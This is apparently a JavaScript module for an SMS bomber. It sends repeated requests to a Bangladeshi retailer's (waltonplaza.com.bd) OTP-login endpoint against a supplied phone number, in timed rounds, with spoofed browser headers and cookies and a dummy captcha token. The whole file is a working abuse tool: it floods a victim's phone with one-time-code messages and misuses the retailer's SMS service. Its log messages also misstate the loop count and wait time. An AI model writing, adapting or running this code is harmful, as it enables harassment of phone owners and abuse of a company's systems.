const axios = require("axios");

async function walton(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const response = await axios.post(
  'https://waltonplaza.com.bd/api/auth/otp/create',
  {
    'auth': {
      'countryCode': '880',
      'deviceUuid': 'a62822e0-51a4-11f0-a849-01a3d19588d8',
      'phone': number,
      'type': 'LOGIN'
    },
    'captchaToken': 'no recapcha'
  },
  {
    headers: {
      'authority': 'waltonplaza.com.bd',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_gcl_gs=2.1.k1$i1750842793$u172102693; _gcl_au=1.1.1765371502.1750842798; _fbp=fb.2.1750842798656.75452712527328085; _gcl_aw=GCL.1750842800.CjwKCAjwvO7CBhAqEiwA9q2YJUtEa_C_DUIbD6Eai9dlcPvLXw6aHiIntlZ9Ofl5M3VdVHF2FiIiwRoCDmQQAvD_BwE; _ga=GA1.1.733999356.1750842800; device-uuid=a62822e0-51a4-11f0-a849-01a3d19588d8; _ga_91FHYEDXE9=GS2.1.s1750842799$o1$g1$t1750842819$j40$l0$h0',
      'origin': 'https://waltonplaza.com.bd',
      'referer': 'https://waltonplaza.com.bd/auth/phone-login',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { walton };
